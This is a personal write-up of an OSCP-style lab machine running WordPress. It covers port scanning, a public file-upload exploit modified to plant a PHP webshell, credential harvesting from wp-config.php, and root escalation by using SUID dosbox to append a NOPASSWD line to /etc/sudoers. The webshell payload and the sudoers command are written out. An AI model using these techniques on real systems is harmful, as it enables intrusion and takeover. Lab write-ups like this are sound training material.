@@ -1,0 +1,241 @@
+**Start 13:08 03-01-2025**
+
+---
+```
+Scope:
+192.168.196.105
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV -oN nmap nukem -T5 -vvvv --min-rate=5000 -sT -p-         
+
+PORT      STATE SERVICE     REASON  VERSION
+22/tcp    open  ssh         syn-ack OpenSSH 8.3 (protocol 2.0)
+80/tcp    open  http        syn-ack Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Retro Gamming &#8211; Just another WordPress site
+|_http-generator: WordPress 5.5.1
+3306/tcp  open  mysql?      syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, HTTPOptions, NULL, afp: 
+|_    Host '192.168.45.238' is not allowed to connect to this MariaDB server
+| mysql-info: 
+|_  MySQL Error: Host '192.168.45.238' is not allowed to connect to this MariaDB server
+5000/tcp  open  http        syn-ack Werkzeug httpd 1.0.1 (Python 3.8.5)
+|_http-title: 404 Not Found
+|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
+13000/tcp open  http        syn-ack nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Login V14
+36445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
+```
+
+It appears we have a webserver called `Retro Gaming` running on **WordPress 5.5.1** (which we will confirm).
+
+We have a **MySQL** database on `3306` to which we are *NOT* allowed to connect.
+
+Port `5000` is running a Python web server (presumably the backend server).
+
+Port `13000` is running **nginx 1.18.0**.
+
+Lastly port `36445` is running a **SMB 4.6.2** server.
+
+
+## 80/TCP - HTTP
+
+To further enumerate I first of all went to the website and checked it out.
+
+![](../../../assets/808ea5499adedb024445542d8d5e91d1.png)
+
+I inspected it closer using *WappAlyzer*:
+
+![](../../../assets/27bf4bfc39bd7da6d6ed6f197e88708d.png)
+
+## wpscan
+
+In order to see what plugins might be vulnerable I used `wpscan` to check the website:
+
+```bash
+wpscan --url http://nukem
+```
+
+I then checked out the file and saw the following that stood out:
+
+![](../../../assets/3a83982cb7e91e302bea79d8e2f5ee14.png)
+
+![](../../../assets/24cfa3031dc06b7acf6a9cb794a49b7c.png)
+
+Knowing this I decided to check whether there's a ready-made PoC available for this version.
+
+![](../../../assets/b805d4ff720204c78388551529221dfe.png)
+
+Found it.
+
+Furthermore I also found the **Simple-file-list** exploit:
+
+![](../../../assets/20c7859ca03ed8c79ee8624aaae866b0.png)
+
+Now this looked a bit more promising, let's try this one out.
+
+
+# Initial Foothold
+
+The PoC looked somewhat as follows:
+
+![](../../../assets/1fb60f5240146f286d9409ef91fb3e4b.png)
+
+This file had to be edited in order for it to work.
+
+I modified **line 36** to the following which would give me a webshell:
+
+```python
+payload = '<?php system($_GET["cmd"]); ?>'
+```
+
+![](../../../assets/cf8b1faf3e97415f6578c7ad4598aeb9.png)
+
+Then I went to the website:
+
+![](../../../assets/fdf04dc4b1a5352a9efbe22f73aa148e.png)
+
+From here I could go ahead and craft up a reverse shell that would connect back to me, but first I got the `local.txt` flag.
+
+
+### local.txt
+
+![](../../../assets/8d2768896ec245a6a6a02745aeceadcb.png)
+
+
+### Reverse Shell - Fail
+
+From here on I had to url encode a simple reverse shell in order to get a normal shell.
+
+>[!fail]
+>Unfortunately enough I tried a bunch of different variations and got stuck, so I had to improvise.
+
+![](../../../assets/8907d84c859a65d7f793624697140316.png)
+
+![](../../../assets/1b758d17078df070d4f1bbb15c586820.png)
+
+
+### Reverse Shell -Success
+
+For this attempt I went ahead and put a php reverse shell in place of the previous webshell command:
+
+![](../../../assets/109d8cdb69eb00f127a5316c3879ac3c.png)
+
+![](../../../assets/1230d733fa5e1237f2dcc97c6e8533eb.png)
+
+Now that I finally had a shell I could get to exploiting.
+
+>[!summary]
+>1) I quickly found out that I had a shell as `http` and I could *NOT* run `sudo -l`.
+>2) I was able to view `commander`'s `/home` directory.
+
+
+## System Enumeration
+
+Before I could go ahead and escalate my privileges, I had to first understand what environment I am dealing with.
+
+To do this I went ahead and issued the following commands:
+
+![](../../../assets/fb62d1a04db788937bfd47456196f8fb.png)
+
+It seems we're dealing with an **Arch Linux** environment, which is a bit different from Debian-based Linux systems.
+
+Since I couldn't find anything useful right away I decided to look for any config files:
+
+```bash
+find / -type f -name "*config*" 2>/dev/null
+```
+
+Amongst these I found this one file:
+
+```bash
+/srv/http/wp-config.php
+```
+
+![](../../../assets/4280ffc3d844fce48b5ce651938cf84f.png)
+
+This could be a really important file for us!!!
+
+![](../../../assets/4b0f719fa5f315713f54bb0851431d9b.png)
+
+Look at that, appears we got the creds for *commander*:
+
+```
+commander
+CommanderKeenVorticons1990
+```
+
+As for the rest of the file I couldn't find anything useful.
+
+![](../../../assets/1ecb98f7884d865a93c3c8e74248e8b6.png)
+
+Like that we're now the *commander* user.
+
+
+## MySQL
+
+![](../../../assets/cad05e0b6ecbddefef8e8e591e3a332d.png)
+
+And now we can enumerate databases.
+
+![](../../../assets/03254de10d8e3060040337b8384a21a4.png)
+
+![](../../../assets/976931ca4c322739435e128c36b070ba.png)
+
+![](../../../assets/6cd15e401e42d6f21f02d8ca10599786.png)
+
+It seems to be only the admin user, for now we'll just note this and look for other vectors to get `root`.
+
+
+# Privilege Escalation
+
+I am not allowed to run `sudo -l` so there must be another way.
+
+Apparently the attack vector was way easier, I looked at the binaries again:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+![](../../../assets/7eb31e6b09268f55b2fa41e1fc57f3c4.png)
+
+I started checking all of them on [gtfobins](https://gtfobins.github.io/gtfobins/dosbox/) when I found `dosbox` to be interesting:
+
+![](../../../assets/76b5697516e1b4d0a39fdd4320541694.png)
+
+I will be writing the following to the `/etc/sudoers` file so *commander* can also become part of the sudoers group.
+
+```bash
+LFILE='/etc/sudoers'
+/usr/bin/dosbox -c  'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
+```
+
+![](../../../assets/fe324a9e54ae9a9fab13f39a8ad7fe3d.png)
+
+Now if everything went correctly, I can go ahead and issue `sudo -l` now.
+
+![](../../../assets/19478a0b5264d71e680bb83a00dc7eee.png)
+
+Awesome.
+
+Now all that's left to do is:
+
+![](../../../assets/d8595b1a26ae3732bada3a5a098786d9.png)
+
+---
+
+**Finished 17:09 03-01-2025**
+
+[^Links]: [[OSCP Prep]] 
+
+#enumeration #Wordpress 
